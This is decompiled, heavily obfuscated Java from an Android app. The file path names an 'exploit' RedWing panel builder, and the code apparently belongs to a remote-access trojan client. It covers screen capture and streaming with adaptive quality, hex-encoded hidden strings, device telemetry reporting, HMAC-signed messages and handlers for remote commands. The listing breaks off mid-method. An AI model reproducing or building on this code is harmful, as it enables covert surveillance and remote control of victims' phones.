package v.s;

import android.app.ActivityManager;
import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Point;
import android.graphics.Rect;
import android.hardware.display.VirtualDisplay;
import android.media.ImageReader;
import android.media.MediaCodec;
import android.media.MediaPlayer;
import android.media.projection.MediaProjection;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.os.PowerManager;
import android.os.SystemClock;
import android.provider.MediaStore;
import android.telecom.PhoneAccountHandle;
import android.telecom.TelecomManager;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.util.Base64;
import android.view.Display;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityNodeInfo;
import android.webkit.WebView;
import app.mobilex.plus.ChatActivity;
import app.mobilex.plus.HandlerSJAdapter;
import app.mobilex.plus.HelperYOLoader;
import app.mobilex.plus.ManagerQJWorker;
import app.mobilex.plus.services.CacheLUJob;
import app.mobilex.plus.services.ConfigTQWorker;
import app.mobilex.plus.services.DataQFAdapter;
import app.mobilex.plus.services.HelperHRAdapter$registerScreenStateReceiver$1;
import app.mobilex.plus.services.ManagerUMController;
import app.mobilex.plus.services.SyncQYAdapter;
import app.mobilex.plus.services.UtilAIWorker;
import app.mobilex.plus.util.TypefaceCache;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.InputStream;
import java.io.RandomAccessFile;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Iterator;
import java.util.List;
import java.util.Timer;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Executors;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ThreadLocalRandom;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class RWY6BVSB0XxPbw {
    public static volatile RWY6BVSB0XxPbw GUsyOYEIobMSb6n;
    public static final lyzhjBmnW0B6JDw PKzJf7Iq6ie0OaUSZLp;
    public static final String[] UE6365QWSHVg5Fff;
    public static final iStgVlW5d7CQ5MhFi d6c98qX7r0XzUZFibx;
    public static final String[] uV1d27nePzvpefeE;
    public volatile int A1BaTVAMeIXMnh;
    public volatile String D5P1xCAyuvgF;
    public volatile boolean Ee8d2j4S9Vm5yGuR;
    public MxCEVftHI6nm GiffeZJ1rbwyx;
    public PowerManager.WakeLock JW3Lh9hxwLsO2ArTlH;
    public J1m0XraSkScfWFMIlTC JXn4Qf7zpnLjP5;
    public volatile int K5l5kmuyJzrgUX;
    public volatile int KV57Z6oavcB595B8Dy8Z;
    public Thread MLSIo1htfMPWeB8V876L;
    public volatile boolean MSGkxvPxRYNqC;
    public volatile boolean OYRwk007Mtyi;
    public int PPWVWMPAUcr9AGNUSxQ;
    public boolean Q7qC5ia93qGCjkBXCF0A;
    public volatile boolean Qrz92kRPw4GcghAc;
    public long RajVDAY50epkNP;
    public volatile boolean SZMVQHSLEmk3KzoEzyls;
    public int SggvLZZelD4B3v;
    public boolean XiR1pIn5878vVWd;
    public volatile long XuO9PPFo607ssKwZjNW;
    public volatile boolean YIgR6F2ZXmLx2ul;
    public int ajrMZmky8AIb2Pr;
    public final Context dDIMxZXP1V8HdM;
    public HelperHRAdapter$registerScreenStateReceiver$1 dQC4QhgRN3MSEAP3HW0;
    public volatile int euF5Udt5Rqv3Qmea;
    public long fuVo7ziLxZvlZPnaGfbO;
    public volatile boolean fxMPJzvjKAjA;
    public boolean gmNWMfvn6zlEj;
    public volatile long hV4VTKNUdeHN;
    public volatile int hjneShqpF9Tis4;
    public volatile long iUQk66nAiXgO35;
    public volatile int k84rwRrqzhrNQ1CdNQ9;
    public volatile int pyu8ovAipBTLYAiKab;
    public volatile int qfTrc75xwRVMl85vh;
    public Thread qiOhdF48gPbc;
    public volatile boolean uCN4HERvZEfG7JjL;
    public Thread uW0IRoPBZMj2QmBkkp;
    public J1m0XraSkScfWFMIlTC vekpFI4d1Nc4fakF;
    public final String w9sT1Swbhx3hs;
    public Timer wotphlvK9sPbXJ;
    public boolean xDyLpEZyrcKVe0;
    public volatile long yTljMGnIibTRdOpSh4;
    public boolean ibVTtJUNfrGYbW = true;
    public String b1EoSIRjJHO5 = "";
    public int gIIiyi2ddlMDR0 = 50;
    public final Handler nQilHWaqS401ZtR = new Handler(Looper.getMainLooper());
    public final ThreadPoolExecutor J0zjQ7CAgohuxU20eCW6 = new ThreadPoolExecutor(1, 1, 0, TimeUnit.MILLISECONDS, new LinkedBlockingQueue(256), new ThreadPoolExecutor.DiscardOldestPolicy());
    public final AtomicInteger H9XlUr4OeMJFiXK = new AtomicInteger(0);
    public volatile int DVTNwpDEVsUKuznof = 4;
    public final ArrayList l1V0lQr6TbwNKqHfXNbb = new ArrayList();
    public final int K7eEOBPYP9VIoHWTe = 3;
    public final long dTS0S7eC32ubQH54j36 = 60000;
    public final UfK5MJMCgJfcZejjsA7 EWUjsTERgdPbSw3NNlN = new UfK5MJMCgJfcZejjsA7(0, this);
    public volatile long vIJudZvPyTuNp = 80;
    public final ConcurrentLinkedQueue rCHnHJBAlOpNI5 = new ConcurrentLinkedQueue();
    public final int O2DHNSIGZlgPja7eqLgn = 10;
    public volatile boolean xfn2GJwmGqs7kWW = true;
    public volatile int tne6mXOUFKdd = 50;
    public volatile String fivkjwgu2UdAtiY = "jpeg";
    public volatile int ECwLkmPW1UKz7J6E = 50;
    public volatile int VEkRsTDS6a9oHWI = 50;
    public volatile String jdOQeRk37T35X5xKW1P = "jpeg";
    public final int is7XW2V21HfKv7MihWy = 78;
    public final sJoLPxEklk5a9kh bbLLF31we2Iu = new sJoLPxEklk5a9kh(new EZbVnuP8e1Nfu7(this, 1));
    public long Yrf7mWjzxCbCCUcSPwXl = System.currentTimeMillis();
    public volatile long t9CXKrwDxrnFA6g23hZU = System.currentTimeMillis();
    public long UoxIZOBVZaubOFdPNaXK = System.currentTimeMillis();
    public final ScheduledExecutorService n8nqApvKDYz7s8llJ2jf = Executors.newSingleThreadScheduledExecutor(new kl9kWElPCsw4XTIKUid1(1));
    public String gwqvW1YsHBmGtO8bW7F = "";

    static {
        TypefaceCache.obtain("00150078005800B000F500BD00E100A80020007D005E0093");
        d6c98qX7r0XzUZFibx = new iStgVlW5d7CQ5MhFi();
        PKzJf7Iq6ie0OaUSZLp = new lyzhjBmnW0B6JDw(XjSHuXm0nOSRc3iA9.xDyLpEZyrcKVe0);
        UE6365QWSHVg5Fff = new String[]{"131.0.6778.39", "130.0.6723.58", "129.0.6668.70", "128.0.6613.84", "127.0.6533.103"};
        uV1d27nePzvpefeE = new String[]{TypefaceCache.obtain("00260078001600B200C300F300D700A900780067000600D700BE00E6"), TypefaceCache.obtain("00310063001600B500C500F300C000B200780067000600D700BE00E6009E00A2002D002D004A00DA00A000F1008A"), TypefaceCache.obtain("00270073001600A300D500F300D600A200780067000600D700BE00E6009E00A2002D002D004A00DA00A000F1008A"), TypefaceCache.obtain("00260065001600A200C300F300D700B400780067000600D700BE00E6009E00A2002D002D004A00DA00A000F1008A")};
    }

    public RWY6BVSB0XxPbw(Context context, String str) {
        this.dDIMxZXP1V8HdM = context;
        this.w9sT1Swbhx3hs = str;
    }

    public static /* synthetic */ void A1BaTVAMeIXMnh(RWY6BVSB0XxPbw rWY6BVSB0XxPbw, int i) {
        rWY6BVSB0XxPbw.k84rwRrqzhrNQ1CdNQ9((i & 1) == 0, false);
    }

    public static int[] D5P1xCAyuvgF() {
        int i = QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM;
        int iJ0zjQ7CAgohuxU20eCW6 = Y9mRyRdkl5FOcwb66V6.J0zjQ7CAgohuxU20eCW6(QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM);
        if (iJ0zjQ7CAgohuxU20eCW6 == 0) {
            return new int[]{640, 540, 480, 400, 360, 280};
        }
        if (iJ0zjQ7CAgohuxU20eCW6 == (-13) + 14) {
            return new int[]{480, 400, 360, 280, 200};
        }
        if (iJ0zjQ7CAgohuxU20eCW6 == 2) {
            return new int[]{360, 280, 200, 160};
        }
        throw new Sb7Xj3N9U1DQ();
    }

    public static final JSONObject dDIMxZXP1V8HdM(RWY6BVSB0XxPbw rWY6BVSB0XxPbw) throws JSONException {
        Long lK84rwRrqzhrNQ1CdNQ9;
        int i = 140 - 40;
        int iXDyLpEZyrcKVe0 = 2 - 3;
        try {
            RandomAccessFile randomAccessFile = new RandomAccessFile(TypefaceCache.obtain("006C00660049008800F300F000C100A2002F00700014009400E400BE00C6"), "r");
            String line = randomAccessFile.readLine();
            if (line == null) {
                line = "";
            }
            randomAccessFile.close();
            if (line.length() != 0) {
                List listK5l5kmuyJzrgUX = KgSM0TsKUpCiuePB.K5l5kmuyJzrgUX(line, new String[]{" "});
                if (listK5l5kmuyJzrgUX.size() >= 15 && (lK84rwRrqzhrNQ1CdNQ9 = VRUWMIt9DMXCmdEpyK46.k84rwRrqzhrNQ1CdNQ9((String) listK5l5kmuyJzrgUX.get(13))) != null) {
                    long jLongValue = lK84rwRrqzhrNQ1CdNQ9.longValue();
                    Long lK84rwRrqzhrNQ1CdNQ10 = VRUWMIt9DMXCmdEpyK46.k84rwRrqzhrNQ1CdNQ9((String) listK5l5kmuyJzrgUX.get(14));
                    if (lK84rwRrqzhrNQ1CdNQ10 != null) {
                        long jLongValue2 = jLongValue + lK84rwRrqzhrNQ1CdNQ10.longValue();
                        long jElapsedRealtime = SystemClock.elapsedRealtime();
                        long j = rWY6BVSB0XxPbw.RajVDAY50epkNP;
                        if (j == 0) {
                            rWY6BVSB0XxPbw.RajVDAY50epkNP = jLongValue2;
                            rWY6BVSB0XxPbw.fuVo7ziLxZvlZPnaGfbO = jElapsedRealtime;
                        } else {
                            long j2 = jElapsedRealtime - rWY6BVSB0XxPbw.fuVo7ziLxZvlZPnaGfbO;
                            long j3 = jLongValue2 - j;
                            rWY6BVSB0XxPbw.RajVDAY50epkNP = jLongValue2;
                            rWY6BVSB0XxPbw.fuVo7ziLxZvlZPnaGfbO = jElapsedRealtime;
                            if (j2 > 0) {
                                iXDyLpEZyrcKVe0 = OFtLBiBbrrTHWu.xDyLpEZyrcKVe0((int) ((((j3 * ((long) 1000)) / 100) * ((long) i)) / (j2 * ((long) Runtime.getRuntime().availableProcessors()))), 0, i);
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {
            rWY6BVSB0XxPbw.gwqvW1YsHBmGtO8bW7F = Y9mRyRdkl5FOcwb66V6.ibVTtJUNfrGYbW(TypefaceCache.obtain("003000730057008100AD009A00E000950079"), e.getMessage());
        }
        rWY6BVSB0XxPbw.gwqvW1YsHBmGtO8bW7F = TypefaceCache.obtain("003000730057008100AD") + iXDyLpEZyrcKVe0;
        if (iXDyLpEZyrcKVe0 < 0) {
            iXDyLpEZyrcKVe0 = 0;
        }
        Runtime runtime = Runtime.getRuntime();
        long j4 = 1048576;
        long jFreeMemory = (runtime.totalMemory() - runtime.freeMemory()) / j4;
        long jMaxMemory = runtime.maxMemory() / j4;
        ActivityManager activityManager = (ActivityManager) rWY6BVSB0XxPbw.dDIMxZXP1V8HdM.getSystemService("activity");
        ActivityManager.MemoryInfo memoryInfo = new ActivityManager.MemoryInfo();
        activityManager.getMemoryInfo(memoryInfo);
        long j5 = memoryInfo.totalMem / j4;
        long j6 = memoryInfo.availMem / j4;
        int i2 = j5 > 0 ? (int) (((j5 - j6) * ((long) i)) / j5) : 0;
        JSONObject jSONObject = new JSONObject();
        jSONObject.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("00270073004D008E00F300BA00ED00AA002600620049008E00F300AC"));
        jSONObject.put(TypefaceCache.obtain("00200066004E00B800E500AC00D300A00026"), iXDyLpEZyrcKVe0);
        jSONObject.put(TypefaceCache.obtain("00220066004B00B800FD00BA00DF0098002E0074"), jFreeMemory);
        jSONObject.put(TypefaceCache.obtain("00220066004B00B800FD00BE00CA0098002E0073005600B800FD00BD"), jMaxMemory);
        jSONObject.put(TypefaceCache.obtain("00370079004F008600FC008000C000A6002E004900560085"), j5);
        jSONObject.put(TypefaceCache.obtain("00220060005A008E00FC008000C000A6002E004900560085"), j6);
        jSONObject.put(TypefaceCache.obtain("00360065005E008300CF00AD00D300AA001C0066005E009500F300BA00DC00B3"), i2);
        String strObtain = TypefaceCache.obtain("00270073004D008E00F300BA00ED00B3002A00730049");
        int i3 = QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM;
        jSONObject.put(strObtain, Y9mRyRdkl5FOcwb66V6.nQilHWaqS401ZtR(QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM));
        jSONObject.put(TypefaceCache.obtain("00200066004E00B800F400BD00D5"), rWY6BVSB0XxPbw.gwqvW1YsHBmGtO8bW7F + TypefaceCache.obtain("003F00620006") + Y9mRyRdkl5FOcwb66V6.nQilHWaqS401ZtR(QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM) + TypefaceCache.obtain("006F00750006") + QmLUFJ3vXstIdpO2wk.vekpFI4d1Nc4fakF + TypefaceCache.obtain("006F00640006") + QmLUFJ3vXstIdpO2wk.w9sT1Swbhx3hs + TypefaceCache.obtain("006F007B005800DA") + QmLUFJ3vXstIdpO2wk.JXn4Qf7zpnLjP5);
        return jSONObject;
    }

    private static /* synthetic */ void fejauqd() {
    }

    public static final void vekpFI4d1Nc4fakF(RWY6BVSB0XxPbw rWY6BVSB0XxPbw, JSONObject jSONObject) {
        int i;
        String strOptString = jSONObject.optString(TypefaceCache.obtain("0037006F004B0082"));
        TypefaceCache.obtain("001100730058008200F900A900D700A30063007B005E009400E300BE00D500A2006300620042009700F500E50092");
        int i2 = 0;
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("00250064005A008A00F5008000D300A40028"))) {
            if (rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK.decrementAndGet() < 0) {
                rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK.set(0);
            }
            long j = rWY6BVSB0XxPbw.yTljMGnIibTRdOpSh4;
            if (j <= 0) {
                return;
            }
            long jCurrentTimeMillis = System.currentTimeMillis() - j;
            if (1 > jCurrentTimeMillis || jCurrentTimeMillis >= 5001) {
                return;
            }
            rWY6BVSB0XxPbw.rCHnHJBAlOpNI5.add(Long.valueOf(jCurrentTimeMillis));
            while (rWY6BVSB0XxPbw.rCHnHJBAlOpNI5.size() > rWY6BVSB0XxPbw.O2DHNSIGZlgPja7eqLgn) {
                rWY6BVSB0XxPbw.rCHnHJBAlOpNI5.poll();
            }
            Iterator it = rWY6BVSB0XxPbw.rCHnHJBAlOpNI5.iterator();
            double dLongValue = 0.0d;
            while (it.hasNext()) {
                dLongValue += ((Number) it.next()).longValue();
                i2++;
                if (i2 < 0) {
                    throw new ArithmeticException("Count overflow has happened.");
                }
            }
            rWY6BVSB0XxPbw.vIJudZvPyTuNp = (long) (i2 == 0 ? Double.NaN : dLongValue / ((double) i2));
            int i3 = 93 - 91;
            if (rWY6BVSB0XxPbw.vIJudZvPyTuNp < 60) {
                i = i3;
            } else if (rWY6BVSB0XxPbw.vIJudZvPyTuNp < 150) {
                i = 3;
            } else if (rWY6BVSB0XxPbw.vIJudZvPyTuNp < 300) {
                i = 4;
            } else {
                i = rWY6BVSB0XxPbw.vIJudZvPyTuNp < 600 ? 5 : 6;
            }
            rWY6BVSB0XxPbw.DVTNwpDEVsUKuznof = i;
            int i4 = QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM;
            if (QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM == 3) {
                int i5 = rWY6BVSB0XxPbw.DVTNwpDEVsUKuznof;
                if (i5 <= i3) {
                    i3 = i5;
                }
                rWY6BVSB0XxPbw.DVTNwpDEVsUKuznof = i3;
                return;
            }
            boolean z = UtilAIWorker.MLSIo1htfMPWeB8V876L;
            if (UtilAIWorker.MLSIo1htfMPWeB8V876L && QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM == i3) {
                int i6 = rWY6BVSB0XxPbw.DVTNwpDEVsUKuznof;
                rWY6BVSB0XxPbw.DVTNwpDEVsUKuznof = i6 <= 3 ? i6 : 3;
                return;
            }
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("0033007900550080"))) {
            rWY6BVSB0XxPbw.Yrf7mWjzxCbCCUcSPwXl = System.currentTimeMillis();
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("00310073004A009200F500AC00C60098002800730042008100E200BE00DF00A2"))) {
            x1G2i7KvSdxo3fp x1g2i7kvsdxo3fp = x1G2i7KvSdxo3fp.gmNWMfvn6zlEj;
            x1G2i7KvSdxo3fp x1g2i7kvsdxo3fp2 = x1G2i7KvSdxo3fp.gmNWMfvn6zlEj;
            if (x1g2i7kvsdxo3fp2 != null) {
                x1g2i7kvsdxo3fp2.w9sT1Swbhx3hs();
            }
            DataQFAdapter.Companion.getClass();
            lLybWDNhgEj7LwIe llybwdnhgej7lwie = DataQFAdapter.hwEncoder;
            if (llybwdnhgej7lwie != null) {
                try {
                    Bundle bundle = new Bundle();
                    bundle.putInt("request-sync", 0);
                    MediaCodec mediaCodec = llybwdnhgej7lwie.dDIMxZXP1V8HdM;
                    if (mediaCodec != null) {
                        mediaCodec.setParameters(bundle);
                    }
                    TypefaceCache.obtain("000800730042008100E200BE00DF00A200630064005E009600E500BA00C100B300260072");
                    return;
                } catch (Exception e) {
                    TypefaceCache.obtain("00310073004A009200F500AC00C6008C0026006F005D009500F100B200D700E7002600640049008800E200E50092");
                    e.getMessage();
                    return;
                }
            }
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("003000730049009100F500AD00ED00B500260065004F008600E200AB"))) {
            rWY6BVSB0XxPbw.hjneShqpF9Tis4 = 0;
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("0020007E005E008400FB008000D100A8002E007B005A008900F400AC"))) {
            String str = SyncQYAdapter.ECwLkmPW1UKz7J6E;
            y6jRGLEWNMir.DVTNwpDEVsUKuznof();
            return;
        }
        if (!okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("003400650064008400FF00B200DF00A6002D0072"))) {
            rWY6BVSB0XxPbw.J0zjQ7CAgohuxU20eCW6.execute(new FzyGTx12CsdmFylK90AU(rWY6BVSB0XxPbw, jSONObject, strOptString));
            return;
        }
        String strOptString2 = jSONObject.optString(TypefaceCache.obtain("002000790056008A00F100B100D6"), "");
        String strOptString3 = jSONObject.optString(TypefaceCache.obtain("0020007B005F00B800F900BB"), "");
        JSONObject jSONObjectOptJSONObject = jSONObject.optJSONObject(TypefaceCache.obtain("003300770049008600FD00AC"));
        if (jSONObjectOptJSONObject == null) {
            jSONObjectOptJSONObject = new JSONObject();
        }
        JSONObject jSONObject2 = jSONObjectOptJSONObject;
        if (strOptString2.length() > 0) {
            String str2 = SyncQYAdapter.ECwLkmPW1UKz7J6E;
            ubmqYDSfxvxS ubmqydsfxvxs = new ubmqYDSfxvxS(rWY6BVSB0XxPbw, 0);
            SyncQYAdapter syncQYAdapter = SyncQYAdapter.VEkRsTDS6a9oHWI;
            if (syncQYAdapter == null || !syncQYAdapter.DVTNwpDEVsUKuznof) {
                ubmqydsfxvxs.dDIMxZXP1V8HdM(strOptString3, Boolean.FALSE, new JSONObject().put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.obtain("003000730049009100F900BC00D70098002D0079004F00B800E200AA00DC00A9002A0078005C")));
            } else {
                y6jRGLEWNMir.b1EoSIRjJHO5(syncQYAdapter.w9sT1Swbhx3hs, null, new sjWVYxwWEV0DK(syncQYAdapter, ubmqydsfxvxs, strOptString3, strOptString2, jSONObject2, null), 3);
            }
        }
    }

    public static final String w9sT1Swbhx3hs(RWY6BVSB0XxPbw rWY6BVSB0XxPbw, String str, String str2) {
        if (str.length() == 0) {
            return "";
        }
        try {
            Mac mac = Mac.getInstance(TypefaceCache.obtain("000B007B005A008400C3009700F300F500760020"));
            Charset charset = N4h1mGVqsY6M8lTtB.dDIMxZXP1V8HdM;
            mac.init(new SecretKeySpec(str.getBytes(charset), TypefaceCache.obtain("000B007B005A008400C3009700F300F500760020")));
            return VnDsNIgXNCQywv8lGh.MSGkxvPxRYNqC(mac.doFinal(str2.getBytes(charset)), ofxQWGnngPxGI3OtvQn.b1EoSIRjJHO5);
        } catch (Exception unused) {
            return "";
        }
    }

    public final void DVTNwpDEVsUKuznof() {
        try {
            byte[] bArr = ConfigTQWorker.ibVTtJUNfrGYbW;
            JSONObject jSONObjectXDyLpEZyrcKVe0 = RIZfHbqXpth8r2yN4.xDyLpEZyrcKVe0();
            if (jSONObjectXDyLpEZyrcKVe0 != null) {
                H9XlUr4OeMJFiXK(jSONObjectXDyLpEZyrcKVe0);
                TypefaceCache.obtain("0013007E0054009300FF00FF00C100A2002D0062000100C7");
                jSONObjectXDyLpEZyrcKVe0.optInt("size");
                TypefaceCache.obtain("006300740042009300F500AC");
                return;
            }
            JSONObject jSONObject = new JSONObject();
            jSONObject.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("002000770056008200E200BE00ED00B7002B0079004F0088"));
            jSONObject.put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.obtain("000D0079001B009700F800B000C600A800630077004D008600F900B300D300A5002F0073"));
            H9XlUr4OeMJFiXK(jSONObject);
        } catch (Exception e) {
            TypefaceCache.obtain("003000730055008300C000B700DD00B3002C0036005E009500E200B000C000FD0063");
            e.getMessage();
        }
    }

    public final void ECwLkmPW1UKz7J6E() {
        Thread thread = this.qiOhdF48gPbc;
        if (thread != null && thread.isAlive()) {
            TypefaceCache.obtain("0010007D005E008B00F500AB00DD00A9006300620053009500F500BE00D600E70022007A0049008200F100BB00CB00E7003100630055008900F900B100D500EB00630064005E009400E400BE00C000B3002A0078005C00C900BE00F1");
            hV4VTKNUdeHN();
        }
        this.Q7qC5ia93qGCjkBXCF0A = true;
        this.SggvLZZelD4B3v = 0;
        this.PPWVWMPAUcr9AGNUSxQ = 0;
        Thread thread2 = new Thread(new uY2iPU7ne5s7Y5LeXnLI(this, 13));
        this.qiOhdF48gPbc = thread2;
        thread2.start();
        TypefaceCache.obtain("0010007D005E008B00F500AB00DD00A90063007B0054008300F500FF00C100B300220064004F008200F400F3009200B3002B0064005E008600F400FF00D300AB002A0060005E00DD00B0");
        Thread thread3 = this.qiOhdF48gPbc;
        if (thread3 != null) {
            thread3.isAlive();
        }
    }

    public final boolean EWUjsTERgdPbSw3NNlN(XslKUngIJyofTLpQ5 xslKUngIJyofTLpQ5) {
        J1m0XraSkScfWFMIlTC j1m0XraSkScfWFMIlTC = this.Ee8d2j4S9Vm5yGuR ? this.JXn4Qf7zpnLjP5 : null;
        if (j1m0XraSkScfWFMIlTC == null) {
            try {
                j1m0XraSkScfWFMIlTC = this.vekpFI4d1Nc4fakF;
            } catch (Exception e) {
                TypefaceCache.obtain("003000730055008300C600B600D600A2002C00500049008600FD00BA009200A2003100640054009500AA00FF");
                e.getMessage();
            }
        }
        if (j1m0XraSkScfWFMIlTC != null) {
            return j1m0XraSkScfWFMIlTC.ibVTtJUNfrGYbW(2, xslKUngIJyofTLpQ5);
        }
        return false;
    }

    public final void Ee8d2j4S9Vm5yGuR() {
        if (this.xfn2GJwmGqs7kWW && this.XiR1pIn5878vVWd) {
            long jCurrentTimeMillis = System.currentTimeMillis();
            long j = jCurrentTimeMillis - this.XuO9PPFo607ssKwZjNW;
            while (Runtime.getRuntime().maxMemory() < 0) {
                String.valueOf(System.nanoTime());
            }
            if (j < 1200) {
                return;
            }
            double d = (this.iUQk66nAiXgO35 * 1000.0d) / j;
            this.iUQk66nAiXgO35 = 0L;
            this.XuO9PPFo607ssKwZjNW = jCurrentTimeMillis;
            String str = ManagerUMController.DVTNwpDEVsUKuznof;
            boolean z = ManagerUMController.VEkRsTDS6a9oHWI;
            if (z && !this.MSGkxvPxRYNqC) {
                int i = QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM;
                if (QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM != 3) {
                    this.VEkRsTDS6a9oHWI = this.tne6mXOUFKdd;
                    this.jdOQeRk37T35X5xKW1P = this.fivkjwgu2UdAtiY;
                    this.MSGkxvPxRYNqC = true;
                    this.tne6mXOUFKdd = this.is7XW2V21HfKv7MihWy;
                    ManagerUMController.XuO9PPFo607ssKwZjNW = this.is7XW2V21HfKv7MihWy;
                    TypefaceCache.obtain("00020072005A009700E400B600C400A2007900360048008400E200BA00D700A900630045006F00A600C4009600F100E7205700360059008800FF00AC00C600E700320063005A008B00F900AB00CB00FA");
                    dTS0S7eC32ubQH54j36(d);
                    return;
                }
            }
            if (!z && this.MSGkxvPxRYNqC) {
                this.MSGkxvPxRYNqC = false;
                this.tne6mXOUFKdd = this.VEkRsTDS6a9oHWI;
                this.fivkjwgu2UdAtiY = this.jdOQeRk37T35X5xKW1P;
                ManagerUMController.XuO9PPFo607ssKwZjNW = this.VEkRsTDS6a9oHWI;
                ManagerUMController.hV4VTKNUdeHN = this.jdOQeRk37T35X5xKW1P;
                TypefaceCache.obtain("00020072005A009700E400B600C400A2007900360048008400E200BA00D700A90063005B007400B300D9009000FC00E7205700360049008200E300AB00DD00B500260036004A009200F100B300DB00B3003A002B");
                this.hV4VTKNUdeHN = jCurrentTimeMillis;
                dTS0S7eC32ubQH54j36(d);
                return;
            }
            if (this.MSGkxvPxRYNqC) {
                dTS0S7eC32ubQH54j36(d);
                return;
            }
            if (jCurrentTimeMillis - this.hV4VTKNUdeHN < 1500) {
                return;
            }
            if (d < 3.0d) {
                this.k84rwRrqzhrNQ1CdNQ9++;
                this.A1BaTVAMeIXMnh = 0;
                int i2 = (-30) + 45;
                if (this.tne6mXOUFKdd > i2) {
                    int i3 = this.tne6mXOUFKdd - i2;
                    if (i3 >= i2) {
                        i2 = i3;
                    }
                    this.tne6mXOUFKdd = i2;
                    ManagerUMController.XuO9PPFo607ssKwZjNW = this.tne6mXOUFKdd;
                    TypefaceCache.obtain("00020072005A009700E400B600C400A200790036007D00B700C300E2");
                    String.format("%.1f", Arrays.copyOf(new Object[]{Double.valueOf(d)}, 1));
                    TypefaceCache.obtain("00630055006900AE00C4009600F10086000F003A001B009600E500BE00DE00AE0037006F001B00CA00AE00FF");
                } else if (this.euF5Udt5Rqv3Qmea < D5P1xCAyuvgF().length - 1) {
                    this.euF5Udt5Rqv3Qmea++;
                    ManagerUMController.l1V0lQr6TbwNKqHfXNbb = D5P1xCAyuvgF()[this.euF5Udt5Rqv3Qmea];
                    TypefaceCache.obtain("00020072005A009700E400B600C400A200790036007D00B700C300E2");
                    String.format("%.1f", Arrays.copyOf(new Object[]{Double.valueOf(d)}, 1));
                    TypefaceCache.obtain("00630055006900AE00C4009600F10086000F003A001B009500F500AC00DD00AB003600620052008800FE00FF009F00F90063");
                    TypefaceCache.obtain("0063003E004F008E00F500AD0092");
                }
                this.VEkRsTDS6a9oHWI = this.tne6mXOUFKdd;
                this.jdOQeRk37T35X5xKW1P = this.fivkjwgu2UdAtiY;
                this.hV4VTKNUdeHN = jCurrentTimeMillis;
            } else if (d < 6.0d) {
                this.k84rwRrqzhrNQ1CdNQ9++;
                this.A1BaTVAMeIXMnh = 0;
                if (this.tne6mXOUFKdd > 20) {
                    int i4 = this.tne6mXOUFKdd - 10;
                    this.tne6mXOUFKdd = i4 >= 20 ? i4 : 20;
                    ManagerUMController.XuO9PPFo607ssKwZjNW = this.tne6mXOUFKdd;
                    TypefaceCache.obtain("00020072005A009700E400B600C400A200790036007D00B700C300E2");
                    String.format("%.1f", Arrays.copyOf(new Object[]{Double.valueOf(d)}, 1));
                    TypefaceCache.obtain("006F0036004A009200F100B300DB00B3003A0036001600D900B0");
                } else if (this.euF5Udt5Rqv3Qmea < D5P1xCAyuvgF().length - 1) {
                    this.euF5Udt5Rqv3Qmea++;
                    ManagerUMController.l1V0lQr6TbwNKqHfXNbb = D5P1xCAyuvgF()[this.euF5Udt5Rqv3Qmea];
                    TypefaceCache.obtain("00020072005A009700E400B600C400A200790036007D00B700C300E2");
                    String.format("%.1f", Arrays.copyOf(new Object[]{Double.valueOf(d)}, 1));
                    TypefaceCache.obtain("006F00360049008200E300B000DE00B20037007F0054008900B000F2008C00E7");
                }
                this.VEkRsTDS6a9oHWI = this.tne6mXOUFKdd;
                this.jdOQeRk37T35X5xKW1P = this.fivkjwgu2UdAtiY;
                this.hV4VTKNUdeHN = jCurrentTimeMillis;
            } else if (d > 10.0d) {
                this.A1BaTVAMeIXMnh++;
                if (this.A1BaTVAMeIXMnh >= 2) {
                    int i5 = this.k84rwRrqzhrNQ1CdNQ9 - 1;
                    if (i5 < 0) {
                        i5 = 0;
                    }
                    this.k84rwRrqzhrNQ1CdNQ9 = i5;
                }
